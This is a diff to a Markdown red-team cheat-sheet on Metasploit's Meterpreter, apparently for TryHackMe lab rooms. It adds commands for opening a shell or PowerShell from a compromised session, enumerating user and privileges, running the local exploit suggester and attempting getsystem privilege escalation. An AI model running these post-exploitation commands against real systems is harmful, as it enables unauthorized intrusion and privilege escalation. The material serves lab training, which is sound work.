@@ -73,6 +73,11 @@ exploit> check opt=value opt2=value [...]
 
 ## Meterpreter
 
+[![blue](../../../../_badges/thm-p/blue.svg)](https://tryhackme.com/room/blue)
+[![ice](../../../../_badges/thm-p/ice.svg)](https://tryhackme.com/room/ice)
+[![blaster](../../../../_badges/thm-p/blaster.svg)](https://tryhackme.com/room/blaster)
+[![steelmountain](../../../../_badges/thmp-p/steelmountain.svg)](https://tryhackme.com/room/steelmountain)
+
 <div class="row row-cols-lg-2"><div>
 
 #### Meterpreter — Overview
@@ -130,6 +135,7 @@ meterpreter> idletime        # time the host was idle
 meterpreter> localtime       # time and date
 meterpreter> getenv PATH     # get PATH
 meterpreter> checksum <file> # get file checksum
+meterpreter> resource commands.txt # Load commands from a file
 ```
 
 You can run commands on your machine in the meterpreter:
@@ -142,12 +148,53 @@ meterpreter> lcat file # Show the contents of a local file
 ```
 </div><div>
 
+You can also pop a shell if you want to:
+
+```shell!
+meterpreter> shell # "sh" on Linux, "cmd" on Windows
+```
+
+```shell!
+meterpreter> load powershell
+meterpreter> powershell_shell
+```
+
+#### Meterpreter — Enumeration
+
+Find which user you compromised and which Operating System/Architecture is the target running <small>(tune your exploits or CVEs)</small>.
+
+```shell!
+meterpreter> getuid
+Windows: NT AUTHORITY\SYSTEM
+meterpreter> sysinfo
+Computer        : XXX-PC
+OS              : Windows X (... Build xxx...).
+Architecture    : x64
+```
+
+You can list [your privileges](/cybersecurity/red-team/s4.privesc/windows/topics/privs.md).
+
+```shell!
+meterpreter> getprivs
+```
+
+You can look for exploits but you often need to migrate first.
+
+```shell!
+meterpreter> run post/multi/recon/local_exploit_suggester
+```
+
 <br>
 
-**Common commands** 🪴
+#### Meterpreter — Windows Exploitation
 
-* [Exploitation commands](_files/msf_exploitation.md)
-* [Post-exploitation commands](_files/msf_post.md)
+You can automatically try to exploit [your privileges](/cybersecurity/red-team/s4.privesc/windows/topics/privs.md).
+
+```shell!
+meterpreter> getsystem -h # List exploits
+```
+
+
 
 </div></div>
 
